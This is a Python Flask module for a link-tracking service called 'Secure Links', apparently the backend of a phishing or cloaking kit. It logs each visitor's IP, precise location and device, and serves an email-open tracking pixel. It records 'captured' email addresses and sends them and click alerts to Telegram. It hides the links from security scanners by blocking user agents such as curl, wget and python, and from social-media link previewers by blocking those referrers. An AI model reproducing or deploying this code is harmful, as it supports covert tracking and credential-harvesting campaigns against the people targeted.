'''
This file contains the tracking logic for the Secure Links project.
'''

from flask import Blueprint, request, redirect, jsonify, make_response
from src.models.user import db
from src.models.link import Link
from src.models.tracking_event import TrackingEvent
from src.utils.user_agent_parser import parse_user_agent, generate_unique_id
import requests
import json
from datetime import datetime
import base64
from src.routes.telegram import notify_new_click, notify_email_capture

track_bp = Blueprint("track", __name__)

def get_client_ip():
    if request.headers.get("X-Forwarded-For"):
        return request.headers.get("X-Forwarded-For").split(",")[0].strip()
    elif request.headers.get("X-Real-IP"):
        return request.headers.get("X-Real-IP")
    else:
        return request.remote_addr

def get_user_agent():
    return request.headers.get("User-Agent", "")

def get_geolocation(ip_address):
    """Enhanced geolocation with zip code and detailed ISP information"""
    try:
        response = requests.get(f"http://ip-api.com/json/{ip_address}?fields=status,message,continent,continentCode,country,countryCode,region,regionName,city,district,zip,lat,lon,timezone,offset,currency,isp,org,as,asname,mobile,proxy,hosting,query", timeout=10)
        if response.status_code == 200:
            data = response.json()
            if data.get("status") == "success":
                return {
                    "country": data.get("country", "Unknown"),
                    "country_code": data.get("countryCode", "Unknown"),
                    "region": data.get("regionName", "Unknown"),
                    "city": data.get("city", "Unknown"),
                    "zip_code": data.get("zip"),
                    "latitude": data.get("lat"),
                    "longitude": data.get("lon"),
                    "timezone": data.get("timezone", "Unknown"),
                    "isp": data.get("isp", "Unknown"),
                    "organization": data.get("org", "Unknown"),
                    "as_number": data.get("as", "Unknown"),
                    "as_name": data.get("asname", "Unknown"),
                    "is_mobile": data.get("mobile", False),
                    "is_proxy": data.get("proxy", False),
                    "is_hosting": data.get("hosting", False)
                }
    except Exception as e:
        print(f"Geolocation error: {e}")
    
    return {
        "country": "Unknown",
        "country_code": "Unknown",
        "region": "Unknown",
        "city": "Unknown",
        "zip_code": "Unknown",
        "latitude": None,
        "longitude": None,
        "timezone": "Unknown",
        "isp": "Unknown",
        "organization": "Unknown",
        "as_number": "Unknown",
        "as_name": "Unknown",
        "is_mobile": False,
        "is_proxy": False,
        "is_hosting": False
    }

def check_geo_targeting(link, geo_data):
    """Enhanced geo targeting check with allow/block logic"""
    if not link.geo_targeting_enabled:
        return {"blocked": False, "reason": None}
    
    country = geo_data.get("country", "Unknown")
    region = geo_data.get("region", "Unknown")
    city = geo_data.get("city", "Unknown")
    
    if country == "Unknown":
        return {"blocked": True, "reason": "unknown_location"}
    
    allowed_countries = json.loads(link.allowed_countries) if link.allowed_countries else []
    blocked_countries = json.loads(link.blocked_countries) if link.blocked_countries else []
    allowed_regions = json.loads(link.allowed_regions) if link.allowed_regions else []
    blocked_regions = json.loads(link.blocked_regions) if link.blocked_regions else []
    allowed_cities = json.loads(link.allowed_cities) if link.allowed_cities else []
    blocked_cities = json.loads(link.blocked_cities) if link.blocked_cities else []
    
    if link.geo_targeting_type == "allow":
        country_allowed = not allowed_countries or country in allowed_countries
        region_allowed = not allowed_regions or region in allowed_regions
        city_allowed = not allowed_cities or city in allowed_cities
        
        if not (country_allowed and region_allowed and city_allowed):
            if not country_allowed:
                return {"blocked": True, "reason": "country_not_allowed"}
            elif not region_allowed:
                return {"blocked": True, "reason": "region_not_allowed"}
            elif not city_allowed:
                return {"blocked": True, "reason": "city_not_allowed"}
    
    else:
        if country in blocked_countries:
            return {"blocked": True, "reason": "country_blocked"}
        if region in blocked_regions:
            return {"blocked": True, "reason": "region_blocked"}
        if city in blocked_cities:
            return {"blocked": True, "reason": "city_blocked"}
    
    return {"blocked": False, "reason": None}

def detect_bot(user_agent, ip_address):
    """Simple bot detection"""
    user_agent_lower = user_agent.lower()
    bot_indicators = [
        "bot", "crawler", "spider", "scraper", "curl", "wget", "python",
        "requests", "urllib", "http", "api", "monitor", "test"
    ]
    
    for indicator in bot_indicators:
        if indicator in user_agent_lower:
            return True
    
    return False

def check_social_referrer():
    """Check if request comes from social media platforms"""
    referrer = request.headers.get("Referer", "").lower()
    social_platforms = ["facebook.com", "twitter.com", "instagram.com", "linkedin.com", "tiktok.com"]
    
    for platform in social_platforms:
        if platform in referrer:
            platform_name = platform.split(".")[0]
            return {"blocked": True, "reason": f"social_referrer_{platform_name}"}
    
    return {"blocked": False, "reason": None}

@track_bp.route("/t/<short_code>")
def track_click(short_code):
    link = Link.query.filter_by(short_code=short_code).first()
    if not link:
        return "Link not found", 404
    
    ip_address = get_client_ip()
    user_agent = get_user_agent()
    timestamp = datetime.utcnow()
    referrer = request.headers.get("Referer", "")
    
    geo_data = get_geolocation(ip_address)
    
    device_info = parse_user_agent(user_agent)
    
    is_bot = detect_bot(user_agent, ip_address)
    
    social_check = check_social_referrer()
    
    geo_check = check_geo_targeting(link, geo_data)
    
    unique_id = request.args.get("uid") or generate_unique_id()
    
    status = "Open"
    block_reason = None
    should_redirect = True
    
    if social_check["blocked"]:
        block_reason = social_check["reason"]
        status = "Blocked"
        should_redirect = False
    elif geo_check["blocked"]:
        block_reason = geo_check["reason"]
        status = "Blocked"
        should_redirect = False
    elif link.bot_blocking_enabled and is_bot:
        block_reason = "bot_detected"
        status = "Bot"
        should_redirect = False
    
    try:
        event = TrackingEvent(
            link_id=link.id,
            timestamp=timestamp,
            ip_address=ip_address,
            user_agent=user_agent,
            country=geo_data["country"],
            region=geo_data["region"],
            city=geo_data["city"],
            zip_code=geo_data["zip_code"],
            latitude=geo_data["latitude"],
            longitude=geo_data["longitude"],
            timezone=geo_data["timezone"],
            isp=geo_data["isp"],
            organization=geo_data["organization"],
            as_number=geo_data["as_number"],
            device_type=device_info["device_type"],
            browser=device_info["browser"],
            browser_version=device_info["browser_version"],
            os=device_info["os"],
            os_version=device_info["os_version"],
            status=status,
            blocked_reason=block_reason,
            email_opened=False,
            redirected=False,
            on_page=False,
            unique_id=unique_id,
            is_bot=is_bot,
            referrer=referrer,
            page_views=1
        )
        
        db.session.add(event)
        db.session.commit()
        
        if should_redirect:
            event.status = "Redirected"
            event.redirected = True
            db.session.commit()
            
            visitor_info = {
                "country": geo_data["country"],
                "device_type": device_info["device_type"],
                "timestamp": timestamp.strftime("%Y-%m-%d %H:%M:%S UTC")
            }
            notify_new_click(link.user_id, link.campaign_name, visitor_info)
        
    except Exception as e:
        db.session.rollback()
        print(f"Error recording tracking event: {e}")
    
    if not should_redirect:
        return f"Access blocked: {block_reason}", 403
    
    if hasattr(link, "preview_template_url") and link.preview_template_url and request.args.get("preview") != "skip":
        preview_url = f'{link.preview_template_url}?target={link.target_url}&uid={unique_id}'
        return redirect(preview_url)
    
    return redirect(link.target_url)


@track_bp.route("/p/<short_code>")
def tracking_pixel(short_code):
    """Tracking pixel endpoint"""
    try:
        link = Link.query.filter_by(short_code=short_code).first()
        if not link:
            return _get_transparent_pixel()
        
        ip_address = get_client_ip()
        user_agent = get_user_agent()
        timestamp = datetime.utcnow()
        
        geo_data = get_geolocation(ip_address)
        
        is_bot = detect_bot(user_agent, ip_address)
        
        social_check = check_social_referrer()
        
        geo_check = check_geo_targeting(link, geo_data)
        
        event_status = "email_opened"
        block_reason = None
        
        if social_check["blocked"]:
            block_reason = social_check["reason"]
            event_status = "blocked"
        elif geo_check["blocked"]:
            block_reason = geo_check["reason"]
            event_status = "blocked"
        elif link.bot_blocking_enabled and is_bot:
            block_reason = "bot_detected"
            event_status = "blocked"
        
        captured_email = request.args.get("email")
        unique_id = request.args.get("id") or request.args.get("uid")
        
        device_info = parse_user_agent(user_agent)
        
        event = TrackingEvent(
            link_id=link.id,
            timestamp=timestamp,
            ip_address=ip_address,
            user_agent=user_agent,
            country=geo_data["country"],
            region=geo_data["region"],
            city=geo_data["city"],
            zip_code=geo_data["zip_code"],
            latitude=geo_data["latitude"],
            longitude=geo_data["longitude"],
            timezone=geo_data["timezone"],
            isp=geo_data["isp"],
            organization=geo_data["organization"],
            as_number=geo_data["as_number"],
            device_type=device_info["device_type"],
            browser=device_info["browser"],
            browser_version=device_info["browser_version"],
            os=device_info["os"],
            os_version=device_info["os_version"],
            captured_email=captured_email,
            status=event_status,
            blocked_reason=block_reason,
            email_opened=True,
            redirected=False,
            on_page=False,
            unique_id=unique_id,
            is_bot=is_bot,
            referrer=request.headers.get("Referer", ""),
            page_views=1
        )
        
        db.session.add(event)
        db.session.commit()

        if captured_email and link.capture_email:
            visitor_info = {
                "country": geo_data["country"],
                "device_type": device_info["device_type"],
                "timestamp": timestamp.strftime("%Y-%m-%d %H:%M:%S UTC")
            }
            notify_email_capture(link.user_id, captured_email, link.campaign_name, visitor_info)

    except Exception as e:
        db.session.rollback()
        print(f"Pixel tracking error: {e}")
    
    return _get_transparent_pixel()

def _get_transparent_pixel():
    """Return a 1x1 transparent PNG pixel"""
    from flask import Response
    
    pixel_data = base64.b64decode("iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNkYPhfDwAChwGA60e6kgAAAABJRU5ErkJggg==")
    
    response = Response(pixel_data, mimetype="image/png")
    response.headers["Cache-Control"] = "no-cache, no-store, must-revalidate"
    response.headers["Pragma"] = "no-cache"
    response.headers["Expires"] = "0"
    
    return response





@track_bp.route("/track/page-landed", methods=["POST"])
def page_landed():
    """Update tracking event status when user lands on target page"""
    data = request.get_json()
    unique_id = data.get("uid")
    
    if not unique_id:
        return jsonify({"error": "Missing unique ID"}), 400
    
    try:
        event = TrackingEvent.query.filter_by(unique_id=unique_id).first()
        if not event:
            return jsonify({"error": "Event not found"}), 404
        
        event.status = "On Page"
        event.on_page = True
        
        # Calculate session duration if start time is available
        if event.timestamp:
            duration = (datetime.utcnow() - event.timestamp).total_seconds()
            event.session_duration = int(duration)
        
        db.session.commit()
        
        return jsonify({"success": True})
        
    except Exception as e:
        db.session.rollback()
        print(f"Error updating page landed status: {e}")
        return jsonify({"error": "Failed to update status"}), 500

@track_bp.route("/track/update-duration", methods=['POST'])
def update_duration():
    data = request.get_json()
    unique_id = data.get('uid')
    duration = data.get('duration')

    if not unique_id or duration is None:
        return jsonify({'error': 'Missing unique ID or duration'}), 400

    try:
        event = TrackingEvent.query.filter_by(unique_id=unique_id).first()
        if not event:
            return jsonify({'error': 'Event not found'}), 404

        event.session_duration = duration
        db.session.commit()

        return jsonify({'success': True})

    except Exception as e:
        db.session.rollback()
        print(f"Error updating session duration: {e}")
        return jsonify({'error': 'Failed to update duration'}), 500

@track_bp.route('/track/email-captured', methods=['POST'])
def email_captured():
    data = request.get_json()
    unique_id = data.get('uid')
    email = data.get('email')

    if not unique_id or not email:
        return jsonify({'error': 'Missing unique ID or email'}), 400

    try:
        event = TrackingEvent.query.filter_by(unique_id=unique_id).first()
        if not event:
            return jsonify({'error': 'Event not found'}), 404

        event.captured_email = email
        db.session.commit()

        return jsonify({'success': True})

    except Exception as e:
        db.session.rollback()
        print(f"Error updating captured email: {e}")
        return jsonify({'error': 'Failed to update email'}), 500

